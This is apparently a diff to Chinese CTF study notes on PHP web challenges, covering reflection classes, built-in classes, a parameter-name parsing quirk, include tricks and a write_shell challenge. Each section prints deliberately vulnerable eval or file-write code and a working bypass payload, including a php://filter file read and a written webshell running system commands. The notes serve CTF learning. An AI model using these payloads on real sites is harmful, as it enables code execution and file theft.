@@ -5544,7 +5544,260 @@ call_user_func($_POST['hello']);
 payload：hello[0]=hello&hello[1]=getFlag
 ```
 
+## PHP 反射类
 
+PHP反射API由若干类组成，可帮助我们用来访问程序的元数据或者同相关的注释交互。借助反射我们可以获取诸如类实现了那些方法，创建一个类的实例（不同于用new创建），调用一个方法（也不同于常规调用），传递参数，动态调用类的静态方法。 反射API是PHP内建的OOP技术扩展，包括一些类，异常和接口，综合使用他们可用来帮助我们分析其它类，接口，方法，属性，方法和扩展。这些OOP扩展被称为反射。
+
+我们用的比较多的是 ReflectionClass类、ReflectionObject 和ReflectionMethod类，
+
+ReflectionClass 通过类名获取类的信息；
+
+ReflectionObject 通过类的对象获取类的信息；
+
+ReflectionMethod 获取一个方法的有关信息。
+
+### 示例
+
+```php
+<?php
+
+class  Printer
+{
+}
+
+class  Student
+{
+    private $name;
+    private $year;
+
+    public function __construct($name, $year)
+    {
+        $this->name = $name;
+        $this->year = $year;
+    }
+
+    public function getValue()
+    {
+        return $this->name;
+    }
+
+    public function setBase(Printer $printer, $name, $year = 10)
+    {
+        $this->name = $name;
+        $this->year = $year;
+    }
+}
+
+echo new ReflectionClass('Student');
+
+# 输出：
+Class [ <user> class Student ] {
+  @@ D:\PHP\test3.php 7-28
+
+  - Constants [0] {
+  }
+
+  - Static properties [0] {
+  }
+
+  - Static methods [0] {
+  }
+
+  - Properties [2] {
+    Property [ <default> private $name ]
+    Property [ <default> private $year ]
+  }
+
+  - Methods [3] {
+    Method [ <user, ctor> public method __construct ] {
+      @@ D:\PHP\test3.php 12 - 16
+
+      - Parameters [2] {
+        Parameter #0 [ <required> $name ]
+        Parameter #1 [ <required> $year ]
+      }
+    }
+
+    Method [ <user> public method getValue ] {
+      @@ D:\PHP\test3.php 18 - 21
+    }
+
+    Method [ <user> public method setBase ] {
+      @@ D:\PHP\test3.php 23 - 27
+
+      - Parameters [3] {
+        Parameter #0 [ <required> Printer $printer ]
+        Parameter #1 [ <required> $name ]
+        Parameter #2 [ <optional> $year = 10 ]
+      }
+    }
+  }
+}
+```
+
+### 例题
+
+由于`=`的优先级比`and`更高，所以只要保证`$v1=1`就可以绕过
+
+根据上面可知，`ReflectionClass` 通过类名获取类的信息；`ReflectionObject` 通过类的对象获取类的信息；那么就在这两个类上面做文章，最后得到下面的payload
+
+```php
+<?php
+highlight_file(__FILE__);
+include ("flag.php");
+$flag = new flag();
+$v1 = $_GET['v1'];
+$v2 = $_GET['v2'];
+$v3 = $_GET['v3'];
+$v0 = is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
+if ($v0) {
+    if (!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\;|\?|[0-9]/", $v2)) {
+        if (!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\?|[0-9]/", $v3)) {
+            eval("$v2('flag')$v3");
+        }
+    }
+} 
+?>
+```
+
+```
+payload：v1=123&v2=echo new ReflectionClass&v3=;
+```
+
+## PHP 内置类
+
+> 参考链接：https://blog.csdn.net/qq_63701832/article/details/131166789
+
+```php
+<?php
+highlight_file(__FILE__);
+error_reporting(0);
+if (isset($_GET['v1']) && isset($_GET['v2'])) {
+    $v1 = $_GET['v1'];
+    $v2 = $_GET['v2'];
+    if (preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v1)) {
+        die("error v1");
+    }
+    if (preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v2)) {
+        die("error v2");
+    }
+    eval("echo new $v1($v2());");
+}
+?>
+```
+
+```php
+<?php
+echo getcwd();
+echo new FilesystemIterator(getcwd());
+
+# 输出当前目录下的第一个文件名
+```
+
+## PHP 传参特性
+
+**源码解析**
+
+```php
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+include ("flag.php");
+$a = $_SERVER['argv'];
+$c = $_POST['fun'];
+if (isset($_POST['CTF_SHOW']) && isset($_POST['CTF_SHOW.COM']) && !isset($_GET['fl0g'])) {
+    if (!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?/", $c) && $c <= 18) {
+        eval("$c" . ";");
+        if ($fl0g === "flag_give_me") {
+            echo $flag;
+        }
+    }
+}
+?> 
+```
+
+**此处的php特性：**在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、+、点、[转换为下划线，但是用一个特性是可以绕过的，就是当[提前出现后，后面的点就不会再被转义了
+such as：CTF[SHOW.COM=>CTF_SHOW.COM
+
+```
+payload：CTF_SHOW=1&CTF[SHOW.COM=1&fun=echo $flag
+```
+
+## include 函数特性
+
+**源码分析**
+
+```php
+<?php
+error_reporting(0);
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match("/flag|system|php|cat|sort|shell|\.|\'|\`|echo|\;|\(/i", $c)){
+        eval($c);
+    }
+} else{
+    highlight_file(__FILE__);
+}
+```
+
+```
+payload：?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
+```
+
+**知识点：include可以不用括号，分号可以用?>代替**
+
+## BUUOJ [红明谷CTF 2021]write_shell
+
+```php
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+function check($input){
+    if(preg_match("/'| |_|php|;|~|\\^|\\+|eval|{|}/i",$input)){
+        // if(preg_match("/'| |_|=|php/",$input)){
+        die('hacker!!!');
+    }else{
+        return $input;
+    }
+}
+
+function waf($input){
+  if(is_array($input)){
+      foreach($input as $key=>$output){
+          $input[$key] = waf($output);
+      }
+  }else{
+      $input = check($input);
+  }
+}
+
+$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';
+if(!file_exists($dir)){
+    mkdir($dir);
+}
+switch($_GET["action"] ?? "") {
+    case 'pwd':
+        echo $dir;
+        break;
+    case 'upload':
+        $data = $_GET["data"] ?? "";
+        waf($data);
+        file_put_contents("$dir" . "index.php", $data);
+}
+?>
+```
+
+代码读起来还是非常简单的，主要的关注点还是在`file_put_contents`这里，这个函数的作用是：文件写入；`$data`就是要写入的内容，其中要注意的是，`file_put_content()`是可以直接执行函数的
+
+```php
+file_put_contents("filename", phpinfo());
+```
+
+那么回来再看，由于`$data`已经写死是字符串了，那么就执行不了了，这里的另一个思路就是写马了，再看文件名是`index.php`，那么在访问的时候是可以执行PHP代码的，最后使用`<??>`就可以绕过正则
+
+```
+payload：action=upload&data=<?system("cat%09/flllllll1112222222lag")?>
+```
 
 # Misc
 
